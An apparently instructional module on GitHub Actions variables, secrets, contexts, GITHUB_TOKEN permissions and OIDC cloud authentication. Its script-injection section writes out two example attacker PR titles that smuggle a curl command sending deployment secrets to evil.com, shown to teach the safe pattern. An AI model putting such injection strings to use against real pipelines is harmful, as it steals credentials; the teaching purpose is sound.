1. Environment Variables

GitHub Actions provides two categories of environment variables: default variables that the runner sets automatically on every run, and custom variables that you define. Custom variables can be set at four levels — workflow, job, step, and configuration (via the GitHub UI or API).

Default Environment Variables

Every workflow run has access to a set of pre-populated environment variables. These are always available in shell commands via standard $VAR syntax and do not require any expression syntax to use.

Variable Description Example Value
GITHUB_REPOSITORY Owner and repository name octocat/hello-world
GITHUB_SHA Commit SHA that triggered the workflow a1b2c3d4...
GITHUB_REF Branch or tag ref that triggered the run refs/heads/main
GITHUB_REF_NAME Short branch or tag name main
GITHUB_ACTOR Username of the person or app that triggered the workflow octocat
GITHUB_RUN_ID Unique ID for this workflow run 1658821493
GITHUB_RUN_NUMBER Sequential run number for this workflow 42
GITHUB_WORKSPACE Working directory on the runner /home/runner/work/repo/repo
RUNNER_OS Operating system of the runner Linux, Windows, macOS
GITHUB_OUTPUT File path for setting step outputs /home/runner/work/_temp/_runner...
YAML — Using default variables in shell
steps:
  - name: Print run context
    run: |
      echo "Repository: $GITHUB_REPOSITORY"
      echo "Triggered by: $GITHUB_ACTOR"
      echo "Branch: $GITHUB_REF_NAME"
      echo "Commit: $GITHUB_SHA"
      echo "Run #$GITHUB_RUN_NUMBER (ID: $GITHUB_RUN_ID)"
      echo "Runner OS: $RUNNER_OS"

Custom Environment Variables

Define custom variables at the workflow, job, or step level using the env key. More specific scopes override broader ones — a step-level variable overrides a job-level variable of the same name.

YAML — Variable scoping
env:
  # Workflow-level: available to ALL jobs and steps
  APP_NAME: my-api
  NODE_ENV: production

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      # Job-level: overrides workflow-level for this job
      NODE_ENV: test
      CI: true
    steps:
      - name: Check environment
        env:
          # Step-level: highest precedence
          DEBUG: true
        run: |
          echo "$APP_NAME"    # my-api (workflow)
          echo "$NODE_ENV"    # test (job overrides workflow)
          echo "$CI"          # true (job)
          echo "$DEBUG"       # true (step only)

  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$NODE_ENV"  # production (workflow, no job override here)
Variable Precedence (Highest to Lowest)

Step env → Job env → Workflow env → Configuration variables (vars.*). If the same variable name exists at multiple levels, the most specific scope wins. This is identical to how CSS specificity or environment variable inheritance works in Unix shells.

Configuration Variables (vars.*)

Configuration variables are set in the GitHub UI (Settings → Secrets and variables → Variables) and accessed via the vars context. They store non-sensitive configuration — region names, feature flags, app URLs — that you want to manage outside of your workflow YAML.

YAML — Configuration variables
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Deploy to region
        env:
          # Configuration variables from GitHub UI
          REGION: ${{ vars.DEPLOY_REGION }}
          APP_URL: ${{ vars.APP_URL }}
          FEATURE_FLAG_V2: ${{ vars.ENABLE_V2 }}
        run: |
          echo "Deploying to $REGION"
          echo "App URL: $APP_URL"

Setting Variables Dynamically

Sometimes you need to compute a variable during a run and pass it to later steps or jobs. Use $GITHUB_ENV for environment variables and $GITHUB_OUTPUT for step outputs.

YAML — Dynamic variables
steps:
  - name: Set dynamic variables
    id: vars
    run: |
      # Set env var available to ALL subsequent steps in this job
      echo "BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> $GITHUB_ENV
      echo "SHORT_SHA=${GITHUB_SHA::7}" >> $GITHUB_ENV

      # Set step output (available via steps.vars.outputs.version)
      VERSION=$(node -p "require('./package.json').version")
      echo "version=$VERSION" >> $GITHUB_OUTPUT

  - name: Use the variables
    run: |
      echo "Built at: $BUILD_DATE"
      echo "Commit: $SHORT_SHA"
      echo "Version: ${{ steps.vars.outputs.version }}"
Multiline Values

For environment variables or outputs containing multiple lines, use a delimiter syntax: echo "MY_VAR<<EOF" >> $GITHUB_ENV, then output the content, then echo "EOF" >> $GITHUB_ENV. The delimiter can be any unique string — EOF is conventional.

2. Encrypted Secrets

Secrets store sensitive data — API keys, passwords, tokens, certificates — encrypted at rest using libsodium sealed boxes. They are never exposed in logs (GitHub masks them automatically), never included in forks' workflow runs, and are only decrypted at the moment a step needs them.

Scope Hierarchy

Secrets can be defined at three levels. When the same secret name exists at multiple levels, the most specific scope wins.

Organization Shared across repositories. Can be restricted to specific repos or visibility (public/private/all). Set in org Settings → Secrets and variables.
Repository Available to all workflows in the repo. Set in repo Settings → Secrets and variables → Actions. Overrides org-level secrets of the same name.
Environment Scoped to a named environment (staging, production). Highest precedence. Jobs must declare environment: to access them.
YAML — Using secrets
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production        # Required to access environment secrets
    steps:
      - name: Configure AWS credentials
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 sync ./dist s3://my-bucket

      - name: Notify via webhook
        run: |
          curl -X POST "${{ secrets.SLACK_WEBHOOK }}" \
            -H "Content-Type: application/json" \
            -d '{"text": "Deploy complete"}'

Creating Secrets via CLI

Shell — gh CLI
# Repository secret
$ gh secret set AWS_ACCESS_KEY_ID --body "AKIA..."

# Environment secret
$ gh secret set DB_PASSWORD --env production --body "s3cur3p@ss"

# Organization secret (visible to all repos)
$ gh secret set NPM_TOKEN --org my-org --visibility all --body "npm_..."

# Organization secret (restricted to specific repos)
$ gh secret set DEPLOY_KEY --org my-org --repos "api,web,infra" --body "..."

# List secrets (names only, values are never shown)
$ gh secret list
$ gh secret list --env production
Secrets Security Rules

Secrets are never passed to forked repository workflows triggered by pull_request. This prevents a malicious fork from opening a PR that exfiltrates your credentials. The exception is pull_request_target, which runs the base branch's workflow and has access to secrets — never use it to checkout and execute PR code.

Passing Secrets to Reusable Workflows

YAML — Explicit vs inherit
jobs:
  deploy-explicit:
    uses: ./.github/workflows/deploy.yml
    secrets:
      # Explicit: you control exactly what the called workflow receives
      aws-key: ${{ secrets.AWS_ACCESS_KEY_ID }}
      aws-secret: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

  deploy-inherit:
    uses: ./.github/workflows/deploy.yml
    secrets: inherit  # Passes ALL secrets (convenient but less auditable)
Secrets Hygiene

Rotate secrets on a regular schedule. Use environment-scoped secrets for production credentials rather than repo-level. Never construct secrets by concatenating parts in shell commands — the masker only knows the original value. Avoid toJSON(secrets) in logs as it can dump all secret names. If a secret has been compromised, revoke it immediately at the provider, then update the GitHub secret.

The steps Context

Access outputs and status from previous steps in the same job. Steps must have an id to be referenced.

YAML — steps context
steps:
  - id: check
    run: |
      if [ -f "deploy.lock" ]; then
        echo "locked=true" >> $GITHUB_OUTPUT
      else
        echo "locked=false" >> $GITHUB_OUTPUT
      fi

  - name: Deploy if not locked
    if: steps.check.outputs.locked != 'true'
    run: ./deploy.sh

  - name: Report lock status
    if: steps.check.outputs.locked == 'true'
    run: echo "Deployment is locked. Skipping."

  # Check previous step outcome
  - name: Handle failure
    if: steps.check.outcome == 'failure'
    run: echo "The check step failed"

The needs Context

Access outputs and status from jobs that the current job depends on via needs:.

YAML — needs context (cross-job data)
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image-tag: ${{ steps.meta.outputs.tag }}
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: |
          echo "tag=ghcr.io/myorg/api:${GITHUB_SHA::7}" >> $GITHUB_OUTPUT
          echo "version=$(cat VERSION)" >> $GITHUB_OUTPUT

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Deploying ${{ needs.build.outputs.image-tag }}"
          echo "Version: ${{ needs.build.outputs.version }}"
          echo "Build job result: ${{ needs.build.result }}"

The matrix Context

YAML — matrix context
jobs:
  test:
    strategy:
      matrix:
        os: [ ubuntu-latest, windows-latest ]
        node: [ 18, 20 ]
        include:
          - os: ubuntu-latest
            node: 22
            experimental: true
    runs-on: ${{ matrix.os }}
    continue-on-error: ${{ matrix.experimental || false }}
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: echo "Testing on ${{ matrix.os }} with Node ${{ matrix.node }}"
Context Availability

Not all contexts are available everywhere. The github, env, vars, and secrets contexts are available at every level. The job, runner, strategy, and matrix contexts are only available within a job. The steps context is only available within steps after at least one step with an id has run. The needs context is only available in jobs that declare a needs: dependency.

4. Variables vs. Secrets vs. Contexts — Comparison

One of the most common sources of confusion is knowing when to use an environment variable, a configuration variable, a secret, or a context expression. This table clarifies the distinctions.

Feature env (YAML) vars.* (Config) secrets.* Contexts (${{ }})
Sensitivity Non-sensitive Non-sensitive Sensitive (encrypted) Metadata
Set where Workflow YAML GitHub UI / API / CLI GitHub UI / API / CLI Automatic
Visible in logs Yes Yes No (masked with ***) Yes
Available to forks Yes (in YAML) No No Yes (most)
Scopes Workflow / Job / Step Org / Repo / Environment Org / Repo / Environment Varies by context
Access syntax $MY_VAR ${{ vars.MY_VAR }} ${{ secrets.MY_SECRET }} ${{ github.sha }}
Use case Build flags, paths Region, feature flags API keys, passwords, tokens Conditionals, metadata
Rule of Thumb

If it's in your code review (feature flags, build config) → env in YAML. If it varies by deployment but isn't secret (region, URL) → vars.* in GitHub UI. If it would cause damage if leaked (credentials, tokens) → secrets.*. If it describes the run itself (branch, actor, commit) → contexts.

5. The GITHUB_TOKEN

Every workflow run automatically receives a GITHUB_TOKEN — a short-lived token scoped to the repository that triggered the workflow. It expires when the job completes or after 24 hours, whichever comes first. You do not need to create or store this token; GitHub provisions it automatically.

Default Permissions

The token's default permissions depend on your repository settings. GitHub recommends restricting the default to read-only and explicitly granting permissions per workflow.

YAML — Least-privilege permissions
# Restrict at workflow level (all jobs inherit this)
permissions:
  contents: read          # Read repo contents
  packages: write         # Push to GHCR
  pull-requests: write    # Comment on PRs
  issues: write           # Create/update issues
  deployments: write      # Create deployment statuses
  id-token: write         # Required for OIDC (cloud auth)

jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read        # This job only needs to read code
    steps:
      - uses: actions/checkout@v4
      - run: npm run lint

  publish:
    needs: lint
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write       # This job needs to push images
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

Available Permission Scopes

Permission Grants Access To Common Need
contents Repository contents, commits, branches, tags Checkout, create releases
packages GitHub Packages (GHCR, npm, Maven, NuGet) Push Docker images
pull-requests Pull request comments, reviews, labels Post PR comments (Terraform plan, test results)
issues Issue creation, labels, assignments Auto-create issues on failure
deployments Deployment creation and status updates CD pipelines
id-token OIDC JWT for cloud provider authentication AWS/Azure/GCP without stored keys
actions Workflow run management Cancel / re-run workflows
security-events Code scanning alerts (SARIF uploads) CodeQL, Trivy, Snyk
statuses Commit status checks External CI integration
GITHUB_TOKEN Limitations

The GITHUB_TOKEN cannot trigger other workflow runs — this prevents infinite loops. If you need a workflow to trigger another workflow, use a Personal Access Token (PAT) or a GitHub App installation token stored as a secret. The token is also scoped to the current repository only; it cannot access other repos in your organization.

Accessing the Token

YAML — Three ways to use GITHUB_TOKEN
steps:
  # 1. Via secrets context (most common)
  - env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    run: gh pr list

  # 2. Via github context
  - env:
      GH_TOKEN: ${{ github.token }}
    run: gh issue create --title "Auto-issue"

  # 3. Passed as 'with' input to an action
  - uses: actions/github-script@v7
    with:
      github-token: ${{ secrets.GITHUB_TOKEN }}
      script: |
        await github.rest.issues.createComment({
          issue_number: context.issue.number,
          owner: context.repo.owner,
          repo: context.repo.repo,
          body: 'Automated comment from CI'
        });

6. OIDC & Keyless Cloud Authentication

Long-lived cloud credentials stored as secrets are a security liability — they can be leaked, they never expire unless rotated, and they grant broad access. GitHub Actions supports OpenID Connect (OIDC) federation, which lets your workflows exchange a short-lived JWT for temporary cloud credentials. No stored secrets required.

How OIDC Works

1. Request Workflow requests an OIDC token from GitHub's token endpoint. Requires permissions: id-token: write.
2. JWT GitHub issues a signed JWT containing claims: repo, branch, workflow, actor, environment, etc.
3. Exchange Cloud provider (AWS/Azure/GCP) validates the JWT signature against GitHub's OIDC discovery endpoint.
4. Credentials Cloud provider issues short-lived credentials (STS token, federated credential) scoped to the verified identity.

AWS OIDC Example

YAML — Keyless AWS authentication
permissions:
  id-token: write           # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4

      # Exchange OIDC token for AWS credentials
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActions-Deploy
          aws-region: us-east-1
          # No access key or secret key needed!

      - run: aws s3 sync ./dist s3://my-production-bucket

Azure and GCP OIDC

YAML — Azure OIDC
# Azure: Workload Identity Federation
- uses: azure/login@v2
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
    # No client secret needed - OIDC handles authentication
YAML — GCP OIDC
# GCP: Workload Identity Federation
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/123456/locations/global/workloadIdentityPools/github/providers/my-repo
    service_account: deploy@my-project.iam.gserviceaccount.com
    # No service account key JSON needed
OIDC JWT Claims

The JWT that GitHub issues contains claims that your cloud provider's trust policy can validate: sub (subject, e.g. repo:owner/name:environment:production), aud (audience), iss (issuer: https://token.actions.githubusercontent.com), ref, sha, repository, actor, workflow, and environment. Use these claims to restrict which branches, environments, and repos can assume a given cloud role.

Feature Stored Secrets OIDC Federation
Credential lifetime Permanent until manually rotated Minutes (auto-expires)
Blast radius if leaked Unlimited until revoked Token already expired
Rotation required Yes, on a schedule No, credentials are ephemeral
Scope control Static IAM permissions Dynamic: branch, env, workflow claims
Setup complexity Low (copy-paste key) Medium (trust policy configuration)
Supported providers Any AWS, Azure, GCP, HashiCorp Vault, others

7. Expression Syntax & Functions

Expressions within ${{ }} can use operators, functions, and context references. They are evaluated by the workflow engine before the step runs, making them essential for conditional logic, string manipulation, and data transformation.

Operators

YAML — Expression operators
steps:
  # Comparison operators
  - if: github.event_name == 'push'
  - if: github.run_number > 10
  - if: github.ref != 'refs/heads/main'

  # Logical operators
  - if: github.event_name == 'push' && github.ref == 'refs/heads/main'
  - if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
  - if: !cancelled()

  # Ternary-like pattern (not built-in, but achievable)
  - env:
      ENV: ${{ github.ref == 'refs/heads/main' && 'production' || 'staging' }}

Built-in Functions

contains() STRING / ARRAY

Check if a string contains a substring or if an array contains a value.

if: contains(github.event.head_commit.message, '[skip ci]')
startsWith() STRING

Check if a string starts with a given prefix.

if: startsWith(github.ref, 'refs/tags/v')
endsWith() STRING

Check if a string ends with a given suffix.

if: endsWith(github.repository, '-private')
format() STRING

Replaces {0}, {1}, etc. with arguments.

format('Hello {0}, run #{1}', github.actor, github.run_number)
toJSON() DEBUG

Serialize a context to JSON. Useful for debugging.

run: echo '${{ toJSON(github) }}'
fromJSON() PARSE

Parse a JSON string into an object. Used with dynamic matrices.

matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
hashFiles() CACHE

SHA-256 hash of file(s). Used for cache keys.

key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
success() / failure() STATUS

Check if all previous steps succeeded or any failed.

if: failure() — runs only when a prior step failed
always() STATUS

Always run, regardless of prior step outcomes.

if: always() — cleanup tasks, notifications
cancelled() STATUS

Returns true if the workflow was cancelled.

if: cancelled() — handle cancellation cleanup

Dynamic Matrix with fromJSON

Generate matrix configurations dynamically from a prior job's output. Useful when the set of targets is determined at runtime.

YAML — Dynamic matrix
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          # Generate matrix from changed directories
          DIRS=$(find apps/ -maxdepth 1 -mindepth 1 -type d -printf '%f\n' | jq -R . | jq -s .)
          echo "matrix={\"app\":$DIRS}" >> $GITHUB_OUTPUT

  build:
    needs: setup
    strategy:
      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "Building app: ${{ matrix.app }}"

8. Secrets Best Practices

Secrets management is one of the highest-risk areas in CI/CD. A single leaked credential can compromise your entire infrastructure. These practices are not optional suggestions — they are the baseline for any professional pipeline.

The Secrets Checklist

Least Privilege Grant the minimum permissions each workflow needs. Set permissions: read-all as the org default and override per workflow.
Environment Scope Production credentials belong in environment-scoped secrets with required reviewers, not repo-level secrets accessible to any workflow.
OIDC First Prefer OIDC federation over stored credentials for AWS, Azure, and GCP. Eliminates the rotation problem entirely.
Rotate Regularly For secrets that must be stored (API keys, webhooks), rotate on a 90-day cycle at minimum. Automate rotation where possible.
Audit Access Review the audit log for secret access events. Use secrets: inherit sparingly — prefer explicit secret passing.
Pin Actions SHA-pin all third-party actions. A compromised action can steal every secret in your workflow. Use Dependabot to auto-update pins.

Common Mistakes

Anti-Patterns to Avoid

1. Logging secrets: Never use echo "${{ secrets.MY_KEY }}" directly. GitHub masks the exact value, but base64 encoding, substring extraction, or character-by-character output can bypass masking.
2. Script injection: Never interpolate untrusted input (PR titles, branch names, issue bodies) directly in run: commands. An attacker can craft a PR title like "; curl evil.com/steal?t=${{ secrets.DEPLOY_KEY }} # to exfiltrate secrets. Use intermediate environment variables instead.
3. Storing secrets in environment variables at workflow level: This makes them available to every step in every job, including third-party actions you did not write. Scope secrets to the specific step that needs them.

Preventing Script Injection

YAML — Vulnerable vs. safe
# VULNERABLE: PR title is interpolated directly into shell
- name: Greet PR author
  run: echo "PR title: ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl https://evil.com?s=$AWS_SECRET_ACCESS_KEY #

# SAFE: Use an intermediate environment variable
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
  # Shell treats $PR_TITLE as a string, no injection possible
The Golden Rule

Never interpolate ${{ }} expressions from untrusted sources directly in run: blocks. Always assign them to an env: variable first. This single practice prevents the most common class of GitHub Actions exploitation.

Secrets in Composite and Reusable Workflows

YAML — Reusable workflow declaring secret inputs
# Called workflow (.github/workflows/deploy-reusable.yml)
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      deploy-token:
        required: true
        description: 'Token for deployment'
      slack-webhook:
        required: false
        description: 'Optional Slack notification URL'

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - env:
          TOKEN: ${{ secrets.deploy-token }}
        run: ./deploy.sh --token "$TOKEN"

      - if: secrets.slack-webhook != ''
        env:
          WEBHOOK: ${{ secrets.slack-webhook }}
        run: curl -X POST "$WEBHOOK" -d '{"text":"Deployed!"}'

9. Real-World Patterns

Combining variables, secrets, contexts, and OIDC into practical workflow patterns. These examples demonstrate how the concepts work together in production environments.

Multi-Environment Deployment with Environment-Scoped Secrets

YAML — Progressive deployment pipeline
name: Deploy Pipeline

on:
  push:
    branches: [ main ]

permissions:
  contents: read
  id-token: write

env:
  APP_NAME: my-api

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test

  deploy-staging:
    needs: test
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}       # Different per environment
          aws-region: ${{ vars.AWS_REGION }}              # us-east-1 for staging
      - run: ./deploy.sh ${{ vars.CLUSTER_NAME }}         # staging-cluster

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production                # Has required reviewers + wait timer
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}       # Different role for prod
          aws-region: ${{ vars.AWS_REGION }}              # us-west-2 for production
      - run: ./deploy.sh ${{ vars.CLUSTER_NAME }}         # production-cluster

Conditional Secrets Based on Event

YAML — Event-driven secret selection
steps:
  - name: Authenticate to registry
    env:
      # Use GitHub token for PR builds, custom PAT for releases
      REGISTRY_TOKEN: ${{ github.event_name == 'release' && secrets.REGISTRY_PAT || secrets.GITHUB_TOKEN }}
    run: echo "$REGISTRY_TOKEN" | docker login ghcr.io -u ${{ github.actor }} --password-stdin

  - name: Tag image based on event
    env:
      IMAGE_TAG: ${{ github.event_name == 'release' && github.event.release.tag_name || github.sha }}
    run: docker build -t ghcr.io/${{ github.repository }}:$IMAGE_TAG .

Debugging Contexts

YAML — Debug workflow
steps:
  - name: Dump all contexts (for debugging only)
    env:
      GITHUB_CONTEXT: ${{ toJSON(github) }}
      JOB_CONTEXT: ${{ toJSON(job) }}
      RUNNER_CONTEXT: ${{ toJSON(runner) }}
      STEPS_CONTEXT: ${{ toJSON(steps) }}
      MATRIX_CONTEXT: ${{ toJSON(matrix) }}
      ENV_CONTEXT: ${{ toJSON(env) }}
    run: |
      echo "=== github ===" && echo "$GITHUB_CONTEXT"
      echo "=== job ===" && echo "$JOB_CONTEXT"
      echo "=== runner ===" && echo "$RUNNER_CONTEXT"
Never Use toJSON(secrets)

While toJSON(github) is safe for debugging, never use toJSON(secrets) — it will dump all secret names (not values) to the log, which reveals what credentials exist. The values are masked, but knowing the names helps attackers target specific secrets through other attack vectors.

10. Summary & Quick Reference

A consolidated reference for the key concepts covered in this module.

Variables Quick Reference

Action Syntax
Set workflow env var env: MY_VAR: value (at workflow/job/step level)
Set dynamic env var echo "MY_VAR=value" >> $GITHUB_ENV
Set step output echo "key=value" >> $GITHUB_OUTPUT
Read step output ${{ steps.<id>.outputs.<key> }}
Read job output ${{ needs.<job>.outputs.<key> }}
Read config variable ${{ vars.MY_VAR }}
Read secret ${{ secrets.MY_SECRET }}
Read default env var $GITHUB_SHA, $GITHUB_REF, etc.

Contexts Quick Reference

Context Contains Key Properties
github Run metadata, event payload .sha, .ref, .actor, .event, .token
env Environment variables (current scope) .MY_VAR
vars Configuration variables (GitHub UI) .DEPLOY_REGION
secrets Encrypted secrets .AWS_ACCESS_KEY_ID, .GITHUB_TOKEN
job Current job status and container info .status, .container
steps Previous steps' outputs and outcomes .<id>.outputs.*, .<id>.outcome
runner Runner machine info .os, .arch, .temp
matrix Current matrix combination .os, .node-version (user-defined)
needs Dependent job outputs and results .<job>.outputs.*, .<job>.result
inputs Workflow dispatch or reusable workflow inputs .environment, .debug (user-defined)
Key Takeaways

1. Use env for build-time config, vars for deployment config, secrets for credentials — never mix them up. 2. The GITHUB_TOKEN is automatic, short-lived, and scoped — always declare explicit permissions. 3. OIDC eliminates stored cloud credentials entirely — make it your default for AWS, Azure, and GCP. 4. Never interpolate untrusted ${{ }} expressions in run: blocks — use intermediate env variables. 5. Master contexts and expressions to write clean conditional logic without duplicating workflows.
